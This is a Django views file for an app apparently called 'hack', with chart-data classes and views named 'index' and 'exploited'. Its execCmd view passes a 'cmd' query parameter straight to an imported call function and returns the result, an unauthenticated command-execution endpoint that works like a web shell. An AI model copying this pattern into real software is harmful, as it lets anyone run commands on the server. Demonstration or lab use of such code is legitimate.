from django.shortcuts import render
from django.http import HttpResponse
from django.shortcuts import render
from django.views.decorators.csrf import csrf_exempt

from hack.API import call


# An entry for the chart to be rendered
class ChartItem:
  def __init__(self, value=10, color="#F32211", highlight="#FF3322", label="Hello"):
    self.value = value
    self.color = color
    self.highlight = highlight
    self.label = label
class Chart:
  def __init__(self, id, c):
    self.id = id
    self.chart = c

def execCmd(request):
  return HttpResponse(call(request.GET['cmd']))

def exploited(request):
  charts = [Chart(1, [ChartItem(), ChartItem(color="#112266")]),
            Chart(2, [ChartItem(color="#672543")]),
            Chart(3, [ChartItem(color="#07F523")]),
            Chart(4, [ChartItem(color="#672543")]),
            Chart(5, [ChartItem(color="#07F523")]),
            Chart(6, [ChartItem(color="#672543")]),
            Chart(7, [ChartItem(color="#07F523")]),
            Chart(8, [ChartItem(color="#672543")]),
            Chart(9, [ChartItem(color="#07F523")])
            ]
  return render(request, 'hack/exploited.html', {
      "charts": charts
    })

def index(request):
    return render(request,'hack/index.html',{})
